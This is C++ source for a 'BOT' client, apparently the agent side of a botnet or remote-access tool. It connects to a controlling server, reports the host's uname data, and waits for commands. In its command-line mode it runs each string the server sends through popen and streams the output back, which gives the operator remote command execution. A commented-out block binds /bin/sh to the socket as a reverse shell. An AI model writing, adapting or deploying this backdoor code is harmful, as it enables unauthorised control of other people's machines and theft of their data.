#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <sys/utsname.h>
#include <unistd.h>

#include "commands.h"
#include "common.h"
#include "log.h"
#include "messages.h"
#include "tcp_client.hpp"
#include "sock.hpp"

#define BUF_SZ 1024

BOT::BOT()
{
	DEBUG(LOG_VERBOSE, "bot initialisation\n");

	this->socket = new Socket();
}

bool BOT::set_ip(char *serv_ip)
{
	DEBUG(LOG_VERBOSE, "bot set IP\n");

	return this->socket->set_ip(serv_ip);
}

bool BOT::set_port(char *serv_port)
{
	DEBUG(LOG_VERBOSE, "bot set port\n");
	
	return this->socket->set_port(serv_port);
}

bool BOT::init_connection()
{
	DEBUG(LOG_VERBOSE, "bot init connection\n");
	
	if (this->socket->create_socket() == false)
		return false;

	if (this->socket->connect_socket() == false) {
		this->socket->close_socket();
		return false;
	}

	return true;
}


bool BOT::main_loop()
{
	int cmd;
	struct command_ctx ctx;

	if (this->hand_shake() == false)
		return false;

	if (this->send_client_info() == false)
		return false;
	
	cmd = CMD_BYE;
	do {
		cmd = this->get_next_cmd(&ctx);
		switch (cmd) {
		case CMD_GET_CLI:
			this->get_cli_mode();
			break;
		case CMD_GET_INFO:
			if (this->send_client_info() == false)
				goto err;
			break;
		case CMD_SHUTDOWN:
			DEBUG(LOG_DEFAULT, "recv shutdown command, dying\n");
			exit(0);
		case CMD_ERR:
			goto err;
		case CMD_NOP:
		default:
			break;
		}
	} while (cmd != CMD_BYE);


	return true;
err:
	return false;
}

//just stub now
static void
feel_ctx(char *msg, int len, struct command_ctx *ctx)
{
	int i, cmd;

	for (i = 0; i < ARRSZ(commands); i++) {
		cmd = 0;
	}

	switch (cmd) {
	case CMD_RECV_FILE:
		break;
	default:
		ctx->cmd = cmd;
		ctx->val = 0;
	}

}

int BOT::get_next_cmd(struct command_ctx *ctx)
{
	char buff[BUF_SZ];
	int len;

	if (this->socket->recv_msg(buff, &len, BUF_SZ) == false)
		return CMD_ERR;
	
	buff[len] = '\0';
	DEBUG(LOG_VERBOSE, "recived msg = %s\n", buff);

	if (strcmp(buff, "get_cli\n") == 0)
		return CMD_GET_CLI;
	if (strcmp(buff, "bye-bye\n") == 0)
		return CMD_BYE;
	if (strcmp(buff, "shutdown\n") == 0)
		return CMD_SHUTDOWN;
	if (strcmp(buff, "get_info\n") == 0)
		return CMD_GET_INFO;
	if (strcmp(buff, "\n") == 0)
		return CMD_NOP;
	
	return CMD_NOP;
}

bool BOT::get_cli_mode()
{
	char buff[BUF_SZ];
	int len, ret;

	DEBUG(LOG_DEFAULT, "try to get command line interface\n");

	while (1) {
		FILE *fp;

		DEBUG(LOG_VERBOSE, "next get_cli_mode iter\n");

		//FIXME: crude realisation.
		//need to check is socket closed
		if (this->socket->recv_msg(buff, &len, BUF_SZ) == false)
			return false;
		
		buff[len] = '\0';
		DEBUG(LOG_VERBOSE, "recv %d bytes,%s\n", len, buff);
		if (strcmp(buff, "EXIT\n") == 0)
			break;

		if ((fp = popen(buff, "r")) == NULL) {
			DEBUG(LOG_DEFAULT, "popen(3) error. input msg is %s",
			    buff);
			continue;
		}

		while (1) {
			ret = fread(buff, 1, BUF_SZ, fp);
			
			if (ret == 0)
				break;

			if (this->socket->send_msg(buff, ret) == false)
				return false;
		}
		//FIXME: check for errors
		pclose(fp);
	}
	/* bind /bin/sh to socket deprecated since can't exit
	int sock;
	char *argv[2] = {"/bin/sh", NULL};

	if (this->socket->get_sock(&sock) == false)
		return false;
	close(0); close(1); close(2);
	dup(sock);
	dup(sock);
	dup(sock);
	ret = execve(argv[0], argv, NULL);
	if (ret == -1) {
		perror("execve:");
		exit(1);
	}
	*/

	DEBUG(LOG_DEFAULT, "out from get_cli_mode\n");

	return true;
}

bool BOT::send_client_info()
{
	struct utsname buf;
	bool ret;

	if (uname(&buf) != 0)
		return false;
	ret = this->socket->send_msg((char *)&buf, sizeof(buf));

	if (ret == false) {
		DEBUG(LOG_DEFAULT, "can't set client information\n");
		return false;
	}

	return true;
}

bool BOT::hand_shake()
{
	char buff[128];
	int len;
	bool ret;

	ret = this->socket->send_msg(HELLO_MSG, strlen(HELLO_MSG));
	if (ret == false) {
		DEBUG(LOG_DEFAULT, "send_msg handshake fail\n");
		return false;
	}

	ret = this->socket->recv_msg(buff, &len, sizeof(buff));
	
	if (ret == false) {
		DEBUG(LOG_DEFAULT, "send_msg handshake fail\n");
		return false;
	}
	
	if (this->validate_server(buff, len) == false) {
		DEBUG(LOG_DEFAULT, "Host validation fail\n");
		return false;
	}

	DEBUG(LOG_DEFAULT, "hand shake success\n");

	return true;
}

bool BOT::validate_server(char *msg, int sz)
{
	DEBUG(LOG_VERBOSE, "recieved msg is %s sz = %d\n",
	    msg, sz);

	if (strncmp(HELLO_ACK, msg, sz) != 0)
		return false;

	return true;
}

bool BOT::close_connection()
{
	DEBUG(LOG_VERBOSE, "bot close connection\n");

	return this->socket->close_socket();
}


